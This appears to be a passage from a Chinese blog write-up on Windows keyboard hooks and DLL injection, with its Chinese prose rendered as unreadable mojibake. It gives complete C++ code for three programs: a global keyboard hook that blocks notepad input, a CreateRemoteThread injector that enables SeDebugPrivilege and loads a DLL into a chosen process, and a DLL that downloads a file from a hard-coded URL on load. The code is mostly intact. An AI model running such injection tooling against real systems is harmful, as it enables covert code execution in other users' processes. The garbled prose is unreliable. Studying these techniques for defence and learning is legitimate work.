<p>Â§ßËá¥ÈÄªËæëÂ∞±ÊòØÔºåÂÖàÂä†ËΩΩÁõÆÊ†ádllÔºåÁÑ∂ÂêéÂà©Áî®<code>GetProcAddress</code> APIËé∑ÂæóhookstartÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºåËøôÈáåÁî®‰∫ÜÂº∫Âà∂Á±ªÂûãËΩ¨ÂåñÔºåstopÂú∞ÂùÄ‰πüÊòØÔºåÂÖ∑‰ΩìÂÜÖÂÆπÈúÄË¶ÅÁúãdllÁöÑÂÆûÁé∞„ÄÇ‰º∞ËÆ°ÊâÄÊúâÁöÑÁÆÄÂçïhookÈÉΩÊòØËøôÊ†∑ÂÆûÁé∞ÁöÑ„ÄÇ</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;KeyHook
#include &quot;stdio.h&quot;
#include &quot;windows.h&quot;

#define DEF_PROCESS_NAME		&quot;notepad.exe&quot;

HINSTANCE g_hInstance &#x3D; NULL;
HHOOK g_hHook &#x3D; NULL;
HWND g_hWnd &#x3D; NULL;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
&#123;
	switch( dwReason )
	&#123;
        case DLL_PROCESS_ATTACH:
			g_hInstance &#x3D; hinstDLL;
			break;

        case DLL_PROCESS_DETACH:
			break;	
	&#125;

	return TRUE;
&#125;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
&#123;
	char szPath[MAX_PATH] &#x3D; &#123;0,&#125;;
	char *p &#x3D; NULL;

	if( nCode &gt;&#x3D; 0 )
	&#123;
		&#x2F;&#x2F; bit 31 : 0 &#x3D;&gt; press, 1 &#x3D;&gt; release
		if( !(lParam &amp; 0x80000000) )&#x2F;&#x2F;ÈáäÊîæÈîÆÁõòÊåâÈîÆÊó∂
		&#123;
			GetModuleFileNameA(NULL, szPath, MAX_PATH);
			p &#x3D; strrchr(szPath, &#39;\\&#39;);

            &#x2F;&#x2F; ÊØîËæÉÂΩìÂâçËøõÁ®ãÂêçÁß∞ÔºåËã•‰∏∫notepad.exeÔºåÂàôÊ∂àÊÅØ‰∏ç‰ºö‰º†ÈÄíÁªôÂ∫îÁî®Á®ãÂ∫èÔºàÊàñËÄÖ‰∏ã‰∏Ä‰∏™Èí©Â≠êÔºâ
			if( !_stricmp(p + 1, DEF_PROCESS_NAME) )
				return 1;
		&#125;
	&#125;

    &#x2F;&#x2F; Â¶ÇÊûú‰∏çÊòØnotepad.exeÔºåÂàôË∞ÉÁî®CallNextHookExÂáΩÊï∞ÔºåÂ∞ÜÊ∂àÊÅØ‰º†ÈÄíÁªôÂ∫îÁî®Á®ãÂ∫è
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
&#125;

#ifdef __cplusplus
extern &quot;C&quot; &#123;
#endif
	__declspec(dllexport) void HookStart()
	&#123;
		g_hHook &#x3D; SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);
	&#125;

	__declspec(dllexport) void HookStop()
	&#123;
		if( g_hHook )
		&#123;
			UnhookWindowsHookEx(g_hHook);
			g_hHook &#x3D; NULL;
		&#125;
	&#125;
#ifdef __cplusplus
&#125;
#endif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>ÂÆûÁé∞‰∫Ü‰∏â‰∏™ÈÉ®ÂàÜÔºåÁ¨¨‰∏ÄÈÉ®ÂàÜÊòØdllmainÂáΩÊï∞ÔºåÁ¨¨‰∫åÈÉ®ÂàÜÊòØ‰∏ªË¶ÅÁöÑhookÂáΩÊï∞ÔºåÁ¨¨‰∏âÈÉ®ÂàÜÊòØË∞ÉÁî®ÁöÑÊé•Âè£Ôºå‰ªéHookMainÂèØÁü•ÔºåhookÊòØ‰ªéHookStartÂºÄÂßãÁöÑ„ÄÇ</p>
<p>‰∫ÜËß£Âà∞<code>SetWindowsHookEx</code>ÂáΩÊï∞ÔºåÊòØhookÁöÑÂÆâË£ÖÂáΩÊï∞ÔºåËøôÈáåÂ∞±‰∏çÂæó‰∏çÊèê‰∏Ä‰∏ãhookÂú®ÂÜÖÂ≠ò‰∏≠ÁöÑÂ≠òÂú®ÂΩ¢Âºè‰∫Ü„ÄÇ</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rosesmall/p/3248300.html">https://www.cnblogs.com/rosesmall/p/3248300.html</a></p>
<p>ÊØè‰∏Ä‰∏™HookÈÉΩÊúâ‰∏Ä‰∏™‰∏é‰πãÁõ∏ÂÖ≥ËÅîÁöÑ<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/159417.htm">ÊåáÈíà</a>ÂàóË°®ÔºåÁß∞‰πã‰∏∫Èí©Â≠ê<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/549479.htm">ÈìæË°®</a>ÔºåÁî±Á≥ªÁªüÊù•Áª¥Êä§„ÄÇËøô‰∏™ÂàóË°®ÁöÑ<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/159417.htm">ÊåáÈíà</a>ÊåáÂêëÊåáÂÆöÁöÑÔºåÂ∫îÁî®Á®ãÂ∫èÂÆö‰πâÁöÑÔºåË¢´HookÂ≠êÁ®ãË∞ÉÁî®ÁöÑ<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/414773.htm">ÂõûË∞ÉÂáΩÊï∞</a>Ôºå‰πüÂ∞±ÊòØËØ•Èí©Â≠êÁöÑÂêÑ‰∏™Â§ÑÁêÜÂ≠êÁ®ã„ÄÇÂΩì‰∏éÊåáÂÆöÁöÑHookÁ±ªÂûãÂÖ≥ËÅîÁöÑÊ∂àÊÅØÂèëÁîüÊó∂ÔºåÁ≥ªÁªüÂ∞±ÊääËøô‰∏™Ê∂àÊÅØ‰º†ÈÄíÂà∞HookÂ≠êÁ®ã„ÄÇ ‰∏Ä‰∫õHookÂ≠êÁ®ãÂèØ‰ª•Âè™ÁõëËßÜÊ∂àÊÅØÔºåÊàñËÄÖ‰øÆÊîπÊ∂àÊÅØÔºåÊàñËÄÖÂÅúÊ≠¢Ê∂àÊÅØÁöÑÂâçËøõÔºåÈÅøÂÖçËøô‰∫õÊ∂àÊÅØ‰º†ÈÄíÂà∞‰∏ã‰∏Ä‰∏™HookÂ≠êÁ®ãÊàñËÄÖÁõÆÁöÑÁ™óÂè£„ÄÇÊúÄÂêéÂÆâË£ÖÁöÑÈí©Â≠êÊîæÂú®ÈìæÁöÑÂºÄÂßãÔºå ËÄåÊúÄÊó©ÂÆâË£ÖÁöÑÈí©Â≠êÊîæÂú®ÊúÄÂêéÔºå‰πüÂ∞±ÊòØÂêéÂä†ÂÖ•ÁöÑÂÖàËé∑ÂæóÊéßÂà∂ÊùÉ„ÄÇ</p>
<p>Windows Âπ∂‰∏çË¶ÅÊ±ÇÈí©Â≠êÂ≠êÁ®ãÁöÑ<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/386432.htm">Âç∏ËΩΩ</a>È°∫Â∫è‰∏ÄÂÆöÂæóÂíåÂÆâË£ÖÈ°∫Â∫èÁõ∏Âèç„ÄÇÊØèÂΩìÊúâ‰∏Ä‰∏™Èí©Â≠êË¢´<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/386432.htm">Âç∏ËΩΩ</a>ÔºåWindows ‰æøÈáäÊîæÂÖ∂Âç†Áî®ÁöÑÂÜÖÂ≠òÔºåÂπ∂Êõ¥Êñ∞Êï¥‰∏™HookÈìæË°®„ÄÇÂ¶ÇÊûúÁ®ãÂ∫èÂÆâË£Ö‰∫ÜÈí©Â≠êÔºå‰ΩÜÊòØÂú®Â∞öÊú™<a target="_blank" rel="noopener" href="http://baike.baidu.com/view/386432.htm">Âç∏ËΩΩ</a>Èí©Â≠ê‰πãÂâçÂ∞±ÁªìÊùü‰∫ÜÔºåÈÇ£‰πàÁ≥ªÁªü‰ºöËá™Âä®‰∏∫ÂÆÉÂÅöÂç∏ËΩΩÈí©Â≠êÁöÑÊìç‰Ωú„ÄÇ</p>
<p>SetWindowsHookExÂáΩÊï∞ÊÄª‰ºöÂú®hookÈìæÁöÑÂºÄÂ§¥ÂÆâË£ÖhookÂ≠êÁ®ã„ÄÇÂΩìÊåáÂÆöÁ±ªÂûãÁöÑHookÁõëËßÜÁöÑ‰∫ã‰ª∂ÂèëÁîüÊó∂ÔºåÁ≥ªÁªüÂ∞±Ë∞ÉÁî®‰∏éËøô‰∏™HookÂÖ≥ËÅîÁöÑ HookÈìæÁöÑÂºÄÂ§¥ÁöÑHookÂ≠êÁ®ã„ÄÇÊØè‰∏Ä‰∏™HookÈìæ‰∏≠ÁöÑHookÂ≠êÁ®ãÈÉΩÂÜ≥ÂÆöÊòØÂê¶ÊääËøô‰∏™‰∫ã‰ª∂‰º†ÈÄíÂà∞‰∏ã‰∏Ä‰∏™HookÂ≠êÁ®ã„ÄÇHookÂ≠êÁ®ã‰º†ÈÄí‰∫ã‰ª∂Âà∞‰∏ã‰∏Ä‰∏™ HookÂ≠êÁ®ãÈúÄË¶ÅË∞ÉÁî®CallNextHookExÂáΩÊï∞„ÄÇ</p>
<p>ÂáΩÊï∞ÂéüÂûãÂ¶Ç‰∏ãÔºö</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">HHOOK SetWindowsHookEx(
int idHook, &#x2F;&#x2F; Èí©Â≠êÁöÑÁ±ªÂûãÔºåÂç≥ÂÆÉÂ§ÑÁêÜÁöÑÊ∂àÊÅØÁ±ªÂûã
HOOKPROC lpfn, &#x2F;&#x2F; Èí©Â≠êÂ≠êÁ®ãÁöÑÂú∞ÂùÄÊåáÈíà„ÄÇÂ¶ÇÊûúdwThreadIdÂèÇÊï∞‰∏∫0
&#x2F;&#x2F; ÊàñÊòØ‰∏Ä‰∏™Áî±Âà´ÁöÑËøõÁ®ãÂàõÂª∫ÁöÑÁ∫øÁ®ãÁöÑÊ†áËØÜÔºå
&#x2F;&#x2F; lpfnÂøÖÈ°ªÊåáÂêëDLL‰∏≠ÁöÑÈí©Â≠êÂ≠êÁ®ã„ÄÇ
&#x2F;&#x2F; Èô§Ê≠§‰ª•Â§ñÔºålpfnÂèØ‰ª•ÊåáÂêëÂΩìÂâçËøõÁ®ãÁöÑ‰∏ÄÊÆµÈí©Â≠êÂ≠êÁ®ã‰ª£Á†Å„ÄÇ
&#x2F;&#x2F; Èí©Â≠êÂáΩÊï∞ÁöÑÂÖ•Âè£Âú∞ÂùÄÔºåÂΩìÈí©Â≠êÈí©Âà∞‰ªª‰ΩïÊ∂àÊÅØÂêé‰æøË∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞„ÄÇ
HINSTANCE hMod, &#x2F;&#x2F; Â∫îÁî®Á®ãÂ∫èÂÆû‰æãÁöÑÂè•ÊüÑ„ÄÇÊ†áËØÜÂåÖÂê´lpfnÊâÄÊåáÁöÑÂ≠êÁ®ãÁöÑDLL„ÄÇ
&#x2F;&#x2F; Â¶ÇÊûúdwThreadId Ê†áËØÜÂΩìÂâçËøõÁ®ãÂàõÂª∫ÁöÑ‰∏Ä‰∏™Á∫øÁ®ãÔºå
&#x2F;&#x2F; ËÄå‰∏îÂ≠êÁ®ã‰ª£Á†Å‰Ωç‰∫éÂΩìÂâçËøõÁ®ãÔºåhModÂøÖÈ°ª‰∏∫NULL„ÄÇ
&#x2F;&#x2F; ÂèØ‰ª•ÂæàÁÆÄÂçïÁöÑËÆæÂÆöÂÖ∂‰∏∫Êú¨Â∫îÁî®Á®ãÂ∫èÁöÑÂÆû‰æãÂè•ÊüÑ„ÄÇ
DWORD dwThreadId &#x2F;&#x2F; ‰∏éÂÆâË£ÖÁöÑÈí©Â≠êÂ≠êÁ®ãÁõ∏ÂÖ≥ËÅîÁöÑÁ∫øÁ®ãÁöÑÊ†áËØÜÁ¨¶„ÄÇ
&#x2F;&#x2F; Â¶ÇÊûú‰∏∫0ÔºåÈí©Â≠êÂ≠êÁ®ã‰∏éÊâÄÊúâÁöÑÁ∫øÁ®ãÂÖ≥ËÅîÔºåÂç≥‰∏∫ÂÖ®Â±ÄÈí©Â≠ê„ÄÇ
);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>ÊääÊàë‰ª¨ÂàõÂª∫ÁöÑÈí©Â≠êÂáΩÊï∞‰Ωú‰∏∫ÂÖ•Âè£Âú∞ÂùÄÔºåÈí©Âà∞Ê∂àÊÅØÂç≥‰º†ÈÄíÁªôËØ•ÂáΩÊï∞„ÄÇËÄåhookÂáΩÊï∞Â∞±ÊòØÁÆÄÂçïÁöÑÔºåÂä´ÊåÅnotepadÁöÑÊ∂àÊÅØÔºå‰∏çÂæÄ‰∏ã‰º†ÈÄíÔºåËøôÂ∞±ÂØºËá¥‰∫ÜnotepadÁöÑËøõÁ®ãÊåâÈîÆÊó†Ê≥ïË¢´Ê≠£Á°ÆÂìçÂ∫î„ÄÇÂÆûÁé∞‰∫Ühook„ÄÇ</p>
<h3 id="dllÊ≥®ÂÖ•‰ª£Á†ÅÂàÜÊûê"><a class="header-anchor" href="#dllÊ≥®ÂÖ•‰ª£Á†ÅÂàÜÊûê">¬∂</a>dllÊ≥®ÂÖ•‰ª£Á†ÅÂàÜÊûê</h3>
<p>ËøòÊòØÁúãÂà∞Ê≥®ÂÖ•‰ª£Á†Å„ÄÇ</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;windows.h&quot;
#include &quot;tchar.h&quot;

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) 
&#123;
    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    LUID luid;

    if( !OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
			              &amp;hToken) )
    &#123;
        _tprintf(L&quot;OpenProcessToken error: %u\n&quot;, GetLastError());
        return FALSE;
    &#125;

    if( !LookupPrivilegeValue(NULL,           &#x2F;&#x2F; lookup privilege on local system
                              lpszPrivilege,  &#x2F;&#x2F; privilege to lookup 
                              &amp;luid) )        &#x2F;&#x2F; receives LUID of privilege
    &#123;
        _tprintf(L&quot;LookupPrivilegeValue error: %u\n&quot;, GetLastError() ); 
        return FALSE; 
    &#125;

    tp.PrivilegeCount &#x3D; 1;
    tp.Privileges[0].Luid &#x3D; luid;
    if( bEnablePrivilege )
        tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes &#x3D; 0;

    &#x2F;&#x2F; Enable the privilege or disable all privileges.
    if( !AdjustTokenPrivileges(hToken, 
                               FALSE, 
                               &amp;tp, 
                               sizeof(TOKEN_PRIVILEGES), 
                               (PTOKEN_PRIVILEGES) NULL, 
                               (PDWORD) NULL) )
    &#123; 
        _tprintf(L&quot;AdjustTokenPrivileges error: %u\n&quot;, GetLastError() ); 
        return FALSE; 
    &#125; 

    if( GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED )
    &#123;
        _tprintf(L&quot;The token does not have the specified privilege. \n&quot;);
        return FALSE;
    &#125; 

    return TRUE;
&#125;

BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)
&#123;
    HANDLE hProcess &#x3D; NULL, hThread &#x3D; NULL;
    HMODULE hMod &#x3D; NULL;
    LPVOID pRemoteBuf &#x3D; NULL;
    DWORD dwBufSize &#x3D; (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
    LPTHREAD_START_ROUTINE pThreadProc;

    &#x2F;&#x2F; #1. dwPID notepad.exe
    if ( !(hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )
    &#123;
        _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;, dwPID, GetLastError());
        return FALSE;
    &#125;

    &#x2F;&#x2F; #2.ÂàÜÈÖç‰∏ÄÂùóÂÜÖÂ≠òÂú®ÁõÆÊ†áËøõÁ®ã‰∏≠ÔºåÁî®Êù•Â≠òÂÇ®dllÁöÑË∑ØÂæÑÔºåËÆæÁΩÆÊùÉÈôê‰∏∫ËØªÂÜô„ÄÇ
    pRemoteBuf &#x3D; VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);

    &#x2F;&#x2F; #3. ÂÜôÂÖ•Ë∑ØÂæÑ
    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);

    &#x2F;&#x2F; #4. LoadLibraryA() API 
    hMod &#x3D; GetModuleHandle(L&quot;kernel32.dll&quot;);
    pThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;);
	
    &#x2F;&#x2F; #5. notepad.exe 
    hThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);	

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
&#125;

int _tmain(int argc, TCHAR *argv[])
&#123;
    if( argc !&#x3D; 3)
    &#123;
        _tprintf(L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;, argv[0]);
        return 1;
    &#125;

    &#x2F;&#x2F; change privilege
    if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )
        return 1;

    &#x2F;&#x2F; inject dll
    if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) )
        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;, argv[2]);
    else
        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;, argv[2]);

    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>ÁúãmainÂáΩÊï∞ÁöÑusageÂ∞±Áü•ÈÅìËøôÊòØ‰∏Ä‰∏™ÂØπÊåáÂÆöpidÊ≥®ÂÖ•ÊåáÂÆödllÁöÑÁ®ãÂ∫è„ÄÇ</p>
<p>ÈáçÁÇπÁúãÂà∞injectdllÂáΩÊï∞Ôºå<code>SetPrivilege</code>Ë¢´Áî®Êù•ËÆæÂÆöÊùÉÈôê„ÄÇ</p>
<p><code>pRemoteBuf =  VirtualAllocEx(hProcess,NULL,dwBufSize,MEM_COMMIT,PAGE_READWRITE)</code>Â∞ÜË¶ÅÊ≥®ÂÖ•ÁöÑdllË∑ØÂæÑÂÜôÂÖ•ÁõÆÊ†áËøõÁ®ãÂÜÖÂ≠ò„ÄÇÂõ†‰∏∫‰ªª‰ΩïÂÜÖÂ≠òÁ©∫Èó¥ÈÉΩÊó†Ê≥ïÂÜôÂÖ•ÔºåÊâÄ‰ª•Ë∞ÉÁî®<code>VirtualAllocExÔºàÔºâ</code>Âú®ÁõÆÊ†áËøõÁ®ãÂàÜÈÖç‰∏ÄÂùóÁºìÂÜ≤Âå∫ÔºåÊåáÂÆöÁºìÂÜ≤Âå∫Â§ßÂ∞è‰∏∫dllÊñá‰ª∂Ë∑ØÂæÑÈïøÂ∫¶„ÄÇÂêåÊó∂ËÆæÂÆöÊùÉÈôê‰∏∫ËØªÂÜô„ÄÇ</p>
<p>ÂÜôÂÖ•Ë∑ØÂæÑ‰πãÂêéÔºåË∞ÉÁî®‰∫ÜÁ∫øÁ®ãÂáΩÊï∞<code>hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);</code>ÂàõÂª∫ËøúÁ®ãÁ∫øÁ®ãÔºåÁ∫øÁ®ãÂ±û‰∫épProcessÔºåËøòÊúâ‰∏Ä‰∫õÂèÇÊï∞ÔºåLoadLibraryWÁöÑÂú∞ÂùÄÂíådllË∑ØÂæÑÁöÑÂú∞ÂùÄ„ÄÇ</p>
<p>ÁúãÂà∞dll‰ª£Á†Å</p>
<figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;windows.h&quot;
#include &quot;tchar.h&quot;

#pragma comment(lib, &quot;urlmon.lib&quot;)

#define DEF_URL     	(L&quot;http:&#x2F;&#x2F;www.naver.com&#x2F;index.html&quot;)
#define DEF_FILE_NAME   (L&quot;index.html&quot;)

HMODULE g_hMod &#x3D; NULL;

DWORD WINAPI ThreadProc(LPVOID lParam)
&#123;
    TCHAR szPath[_MAX_PATH] &#x3D; &#123;0,&#125;;

    if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )
        return FALSE;
	
    TCHAR *p &#x3D; _tcsrchr( szPath, &#39;\\&#39; );
    if( !p )
        return FALSE;

    _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME);

    URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL);

    return 0;
&#125;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
&#123;
    HANDLE hThread &#x3D; NULL;

    g_hMod &#x3D; (HMODULE)hinstDLL;

    switch( fdwReason )
    &#123;
    case DLL_PROCESS_ATTACH : 
        OutputDebugString(L&quot;&lt;myhack.dll&gt; Injection!!!&quot;);
        hThread &#x3D; CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
        CloseHandle(hThread);
        break;
    &#125;

    return TRUE;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
<p>Ëøô‰∏™Â∞±ÊØîËæÉÁÆÄÂçï‰∫ÜÔºåÊÑèÊÄùÂ∞±ÊòØË∞ÉÁî®ÊåáÂÆöÁöÑAPI‰∏ãËΩΩÊåáÂÆöÁöÑÊñá‰ª∂Âà∞ÊåáÂÆöÁöÑÂú∞ÁÇπ„ÄÇ</p>
<p>Áªº‰∏äÔºöÊ≥®ÂÖ•ÁöÑmainÂáΩÊï∞ÔºåÂàõÂª∫‰∏Ä‰∏™Êñ∞Á∫øÁ®ãÂä†ËΩΩÊåáÂÆöË∑ØÂæÑÁöÑdllÔºåËÄåËØ•dllÂÆûÁé∞ËøúÁ®ã‰∏ãËΩΩÁöÑÂäüËÉΩ„ÄÇ</p>
<p>ËøôÈáåÂà©Áî®‰∫Ü‰∏Ä‰∏™Windows os‰∏ãÁöÑÁâπÊÄßÔºåÁî±‰∫éË¶Å‰ΩøÂæóÊåáÂÆöÁöÑÁ∫øÁ®ãÂä†ËΩΩÔºåÂàôÈúÄË¶ÅÁü•ÈÅìÁõÆÊ†áÁ∫øÁ®ãÁöÑAPIÂáΩÊï∞Âú∞ÂùÄÔºå‰ΩÜÊòØÂú®Windows‰∏≠ÔºåÂõ†‰∏∫OSÊ†∏ÂøÉdll‰ºöË¢´Âä†ËΩΩÂà∞Ëá™Ë∫´Âõ∫ÂÆöÁöÑÂú∞ÂùÄÔºådllÊ≥®ÂÖ•Âà©Áî®ÁöÑÂ∞±ÊòØwindow OSÁöÑËøô‰∏ÄÁâπÊÄß„ÄÇÊâÄ‰ª•ÔºåÂØºÂÖ•InjectDll.exeËøõÁ®ã‰∏≠ÁöÑLoadLibraryWÔºàÔºâÂú∞ÂùÄ‰∏éÂØºÂÖ•notepad.exeËøõÁ®ã‰∏≠ÁöÑLoadLibraryWÔºàÔºâÂú∞ÂùÄÊòØÁõ∏ÂêåÁöÑ„ÄÇ</p>
<h2 id="0x03-ÂÆûË∑µ"><a class="header-anchor" href="#0x03-ÂÆûË∑µ">¬∂</a>0x03 ÂÆûË∑µ</h2>
<h3 id="hookÂÆûË∑µ"><a class="header-anchor" href="#hookÂÆûË∑µ">¬∂</a>hookÂÆûË∑µ</h3>
<p>ËøôÈáåÁúãÂà∞ÂìçÂ∫îÂáΩÊï∞ÔºåÊõ¥Êîπ‰∏∫Â¶Ç‰∏ã:</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/d8020a30306069b8.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ÂºπÂá∫ËÆ°ÁÆóÂô®ÂèØËÉΩÊïàÊûúÊõ¥Âä†Áõ¥ËßÇ„ÄÇ</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/a05ba7f4c9734402.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ËøõÁ®ãÂêçÂ≠óÊîπ‰∏∫notepad++.exeÔºåÁÑ∂Âêé‰ΩøÁî®g++ÁºñËØë‰ª£Á†Å„ÄÇ</p>
<p><code> g++ --share ai.cpp -o ai.dll</code></p>
<p>ÁºñËØëÂÆåÊØï‰πãÂêéÔºåÊäädllÂíåexeÊîæÂú®‰∏Ä‰∏™ÁõÆÂΩï‰∏ãÔºåÁÑ∂ÂêéËøêË°åexe</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/jeNzFS"><img src="https://s1.ax1x.com/2022/06/28/jeNzFS.jpg" srcset="/img/loading.gif" lazyload alt="jeNzFS.jpg"></a></p>
<p>hookÊàêÂäü</p>
<h3 id="dllÂÆûË∑µ"><a class="header-anchor" href="#dllÂÆûË∑µ">¬∂</a>dllÂÆûË∑µ</h3>
<p>ÂêåÊ†∑ÁöÑÊñπÂºèÔºåÁºñËØë‰ª£Á†ÅÔºåÊ≥®ÊÑè‰øÆÊîπÔºå‰ΩøÂæóÂèØ‰ª•ÂºπÂá∫ËÆ°ÁÆóÂô®„ÄÇ</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/5ca74cf4d01afec0.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>‰ΩÜÊòØËøôËæπÁºñËØë‰ª£Á†ÅÁöÑÊó∂ÂÄôÂá∫‰∫ÜÂæàÂ§öÈóÆÈ¢òÔºå‰∫éÊòØÊää_tprintfÂÖ®ÈÉ®ÊõøÊç¢Êàê‰∫ÜprintfÔºå‰∏îÊâÄÊúâÂ≠óÁ¨¶‰∏≤ÂéªÊéâ‰∫ÜLÂâçÁºÄ„ÄÇ</p>
<p>ÊåâÈÅìÁêÜÊù•ËÆ≤_tprintf‰∏çÂ∫îËØ•Êä•ÈîôÊâçÂØπ„ÄÇ</p>
<p>‰πãÂêéÊâìÂºÄnotepad Êü•Áúã‰∏Ä‰∏ãËøõÁ®ãÂè∑„ÄÇ</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/c79a29b29937d691.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ËøêË°åÂÜåÁ®ãÂ∫èÊ≥®ÂÖ•dll„ÄÇÊîπ‰∏Ä‰∏ã‰ª£Á†Å</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/d90a487ccffa6fab.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/f4bb4a0ecd50f354.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ÊàêÂäüÂºπÂá∫ËÆ°ÁÆóÂô®„ÄÇ</p>
<h2 id="0x04-dllÊ≥®ÂÖ•ÂÆûÁé∞ÊèêÊùÉ"><a class="header-anchor" href="#0x04-dllÊ≥®ÂÖ•ÂÆûÁé∞ÊèêÊùÉ">¬∂</a>0x04 dllÊ≥®ÂÖ•ÂÆûÁé∞ÊèêÊùÉ</h2>
<p>ÂâçÈù¢ÁúãdllÊ≥®ÂÖ•‰ª£Á†ÅÁöÑÊó∂ÂÄôÔºåÊúâ‰∏Ä‰∏™ÊèêÊùÉÂáΩÊï∞„ÄÇËøôÈáåÂàÜÊûê‰∏Ä‰∏ã</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/059bd42051f18c03.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>È¶ñÂÖàÊâìÂºÄÂΩìÂâçËøõÁ®ãÁöÑ‰ª§ÁâåÔºåÂ≠òÂÇ®Âú®hToken‰∏≠„ÄÇ</p>
<p><img src="https://i.bmp.ovh/imgs/2022/06/28/43e0fa220e4b1b89.png" srcset="/img/loading.gif" lazyload alt=""></p>
